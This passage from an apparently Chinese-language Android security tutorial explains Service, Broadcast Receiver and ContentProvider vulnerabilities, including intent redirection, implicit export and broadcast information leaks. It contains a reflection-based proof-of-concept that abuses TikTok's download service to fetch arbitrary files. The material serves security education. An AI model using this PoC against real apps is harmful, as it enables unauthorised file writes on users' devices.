Tiktok 的 `IndependentProcessDownloadService`，在 `DownloadService` 的 onBind
中返回了上述 AIDL 接口的实例：
_com/ss/android/socialbase/downloader/downloader/DownloadService.java_ :
    if (this.downloadServiceHandler != null) {
        return this.downloadServiceHandler.onBind(intent);
    }
而其中有个 `tryDownload` 方法可以指定 url 和文件路径将文件下载并保存到本地。虽然攻击者没有 AIDL
文件，但还是可以通过反射去构造出合法的请求去进行调用，PoC 中关键的代码如下：
    private ServiceConnection mServiceConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName cName, IBinder service) {
            processBinder(service);
        }
        public void onServiceDisconnected(ComponentName cName) { }
    };
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent("com.ss.android.socialbase.downloader.remote");
        intent.setClassName(
            "com.zhiliaoapp.musically",
            "com.ss.android.socialbase.downloader.downloader.IndependentProcessDownloadService");
        bindService(intent, mServiceConnection, BIND_AUTO_CREATE);
    }
    private void processBinder(IBinder binder) {
        ClassLoader cl = getForeignClassLoader(this, "com.zhiliaoapp.musically");
        Object handler = cl.loadClass("com.ss.android.socialbase.downloader.downloader.i$a")
                .getMethod("asInterface", IBinder.class)
                .invoke(null, binder);
        Object payload = getBinder(cl);
        cl.loadClass("com.ss.android.socialbase.downloader.downloader.i")
                .getMethod("tryDownload", cl.loadClass("com.ss.android.socialbase.downloader.model.a"))
                .invoke(handler, payload);
    }
    private Object getBinder(ClassLoader cl) throws Throwable {
        Class utilsClass = cl.loadClass("com.ss.android.socialbase.downloader.utils.g");
        Class taskClass = cl.loadClass("com.ss.android.socialbase.downloader.model.DownloadTask");
        return utilsClass.getDeclaredMethod("convertDownloadTaskToAidl", taskClass)
                .invoke(null, getDownloadTask(taskClass, cl));
    }
关键在于使用 `Context.getForeignClassLoader` 获取其他应用的 ClassLoader。
> 漏洞细节参考： [vulnerabilities in the TikTok Android
> app](https://blog.oversecured.com/Oversecured-detects-dangerous-> vulnerabilities-in-the-TikTok-Android-app/#vulnerability-via-> independentprocessdownloadservice-aidl-interface)
## Intent Redirect
这个其实和 Activity 中的对应漏洞类似，客户端启动/绑定 Service 的时候也指定了隐式或者显式的
Intent，其中的不可信数据如果被服务端用来作为启动其他组件的参数，就有可能造成一样的 Intent 重定向问题。注意除了 `getIntent()`
之外还有其他数据来源，比如服务中实现的 `onHandleIntent` 的参数。
其实最早提出 Intent 重定向危害的 "LaunchAnywhere" 漏洞就是出自系统服务，准确来说是 `AccountManagerService`
的漏洞。AccountManager 正常的执行流程为：
  1. 普通应用（记为 A）去请求添加某类账户，调用 AccountManager.addAccount；
  2. AccountManager 会去查找提供账号的应用（记为 B）的 Authenticator 类；
  3. AccountManager 调用 B 的 Authenticator.addAccount 方法；
  4. AccountManager 根据 B 返回的 Intent 去调起 B 的账户登录界面（AccountManagerResponse.getParcelable）；
在第 4 步时，系统认为 B 返回的数据是指向 B 的登陆界面的，但实际上 B 可以令其指向其他组件，甚至是系统组件，就造成了一个 Intent
重定向的漏洞。这里 Intent 的来源比较曲折，但本质还是攻击者可控的。
关于该漏洞的细节和利用过程可参考：[launchAnyWhere: Activity组件权限绕过漏洞解析(Google Bug 7699048
)](http://retme.net/index.php/2014/08/20/launchAnyWhere.html)
# Receiver
[Broadcast
Receiver](https://developer.android.com/guide/components/broadcasts)，简称
receiver，即广播接收器。前面介绍的 Activity 和 Service
之间的联动都是一对一的，而很多情况下我们可能想要一对多或者多对多的通信方案，广播就承担了这个功能。比如，Android
系统本身就会在发生各种事件的时候发送广播通知所有感兴趣的应用，比如开启飞行模式、网络状态变化、电量不足等等。这是一种典型的发布/订阅的设计模式，广播数据的载体也同样是
`Intent`。
与前面 Activity 与 Service 不同的是，Receiver 可以在 manifest
中进行声明注册，称为静态注册；也可以在应用运行过程中进行动态注册。但无论如何，定义的广播接收器都要继承自
[BroadcastReceiver](https://developer.android.com/reference/android/content/BroadcastReceiver)
并实现其声明周期方法 `onReceive(context, intent)`。
注意 BroadcastReceiver 的父类是 Object，不像 Activity 与 Service 是 Context，因此 onReceive
还会额外传入一个 context 对象。
shell 中发送广播的命令如下：
    am broadcast [--user  | all | current] 
下面还是按顺序介绍一些常见的问题。
## Implicit Export
使用静态注册的 receiver 倒没什么特殊，示例如下：
同样存在和之前一样的默认 export 问题，相信大家已经看腻了，就不再啰嗦了。接着看动态注册的情况，比如：
    BroadcastReceiver br = new MyBroadcastReceiver();
    IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
    filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
    this.registerReceiver(br, filter);
与清单中的定义相比，动态注册的方式可能更容易忽略导出权限的问题。上述代码片段动态注册了一个广播，但没有显式声明 exported
属性，因此默认是导出的。事实上使用 registerReceiver 似乎没有简单的方法去设置 `exported=false`，而 Google
官方的建议是对于不需要导出的广播接收器使用 `LocalBroadcastManager.registerReceiver` 进行注册，或者在注册的时候指定
permission 权限。
对于指定 permission 权限的情况，如果是自定义权限，需要在应用清单中声明，比如：
signature
表示只有在请求授权的应用使用与声明权限的应用相同的证书进行签名时系统才会授予的权限。如果证书匹配，则系统会在不通知用户或征得用户明确许可的情况下自动授予权限。详见
[protectionLevel](https://developer.android.com/reference/android/R.attr#protectionLevel)。
最后在动态注册时指定该权限即可：
    this.registerReceiver(br, filter, "com.evilpan.MY_PERMISSION", null);
注册未带有权限限制的导出广播接收器会导致接收到攻击者伪造的恶意数据，如果在 onReceive 时校验不当，可能会出现越权或者 Intent
重定向等漏洞，造成进一步的安全危害。
这类安全问题很多，比较典型的就有 Pwn2Own 上用于攻破三星 Galaxy S8 的 [PpmtReceiver
漏洞](https://paper.seebug.org/1050/)。
## 信息泄露
上面主要是从限制广播发送方的角度去设置权限，但其实这个权限也能限制广播的接收方，只不过发送消息的时候要进行额外的指定，比如要想只让拥有上述权限的接收方受到广播，则发送代码如下：
    Intent it = new Intent(this, ...);
    it.putExtra("secret", "chicken2beautiful")
    sendBroadcast(it, "com.evilpan.MY_PERMISSION");
如果不带第二个参数的话，默认是所有满足条件的接受方都能受到广播信息的。此时若是发送的 Intent 中带有敏感数据，就可能会造成信息泄露问题。
一个实际案例就是
[CVE-2018-9581](https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/)，系统在广播
android.net.wifi.RSSI_CHANGED 时携带了敏感数据 RSSI，此广播能被所有应用接收，从而间接导致物理位置信息泄露。（搞笑？）
可见对于 Broadcast Receiver 而言，permission 标签的作用尤其明显。对于系统广播而言，比如
`BOOT_COMPLETED`，通常只有系统应用才有权限发送。这都是在 [framework 的
AndroidManifest.xml](https://android.googlesource.com/platform/frameworks/base/+/master/core/res/AndroidManifest.xml)
中进行定义的。
而对于应用的自定义广播，通常是使用上述自定义权限，那么也就自然想到一个问题，如果多个应用定义了同一个权限会怎么样？其实这是正是一个历史漏洞，在早期
Android 的策略是优先采用第一个定义的权限，但在 Andorid 5
之后就已经明确定义了两个应用不同定义相同的权限（除非他们的签名相同），否则后安装的应用会出现
`INSTALL_FAILED_DUPLICATE_PERMISSION` 错误警告。感兴趣的考古爱好者可以参考下面的相关文章：
  * [Vulnerabilities with Custom Permissions](https://github.com/commonsguy/cwac-security/blob/master/PERMS.md)
  * [Custom Permission Vulnerability and the 'L' Developer Preview](https://commonsware.com/blog/2014/08/04/custom-permission-vulnerability-l-developer-preview.html)
## Intent Redirection
原理不多说了，直接看案例吧。漏洞出在 Tiktok 的 `NotificationBroadcastReceiver` 中，定义了 intent-filter 导致组件默认被设置为导出，因此可以接收到外部应用的广播，而且又将广播中的不可信数据直接拿来启动 Activity，如下：
> 漏洞细节可参考：[Oversecured detects dangerous vulnerabilities in the TikTok Android
> app](https://blog.oversecured.com/Oversecured-detects-dangerous-> vulnerabilities-in-the-TikTok-Android-app/)
# ContentProvider
[Content
Provider](https://developer.android.com/guide/topics/providers/content-providers)，即内容提供程序，简称为 Provider。Android 应用通常实现为 MVC 结构（Model-View-Controller），Model 部分即为数据来源，供自身的 View
即图形界面进行展示。但有时候应用会想要将自身的数据提供给其他数据使用，或者从其他应用中获取数据。
定义一个 ContentProvider 的方式，只需要继承自
[ContentProvider](https://developer.android.com/reference/android/content/ContentProvider)
类并实现六个方法： `query`，`insert`， `update`， `delete`， `getType` 以及 `onCreate`。其中除了
onCreate 是系统在主线程调用的，其他方法都由客户端程序进行主动调用。自定义的 provider 必须在程序清单中进行声明，后文会详细介绍。
可以看到 Provider 主要实现了类似数据库的增删改查接口，从客户端来看，查询过程也和查询传统数据库类似，例如，下面是查询系统短信的代码片段：
    Cursor cursor = getContentResolver().query(
        Telephony.Sms.Inbox.CONTENT_URI,           // 指定要查询的表名
        new String[] { Telephony.Sms.Inbox.BODY }, // projection 指定索要查询的列名
        selectionClause,                           // 查询的过滤条件
        selectionArgs,                             // 查询过滤的参数 
        Telephony.Sms.Inbox.DEFAULT_SORT_ORDER);   // 返回结果的排序
    while (cursor.moveToNext()) {
        Log.i(TAG, "msg: " + cursor.getString(0));
    }
其中 `ContentResolver` 是 `ContentInterface` 子类，后者是 ContentProvider
的客户端远程接口，可以实现其透明的远程代理调用。 `content_uri` 可以看作是查询的表名，`projection` 可以看作是列名，返回的
cursor 是查询结果行的迭代器。
与前面三个组件不同，在 shell 中访问 provider 组件的工具是 `content`。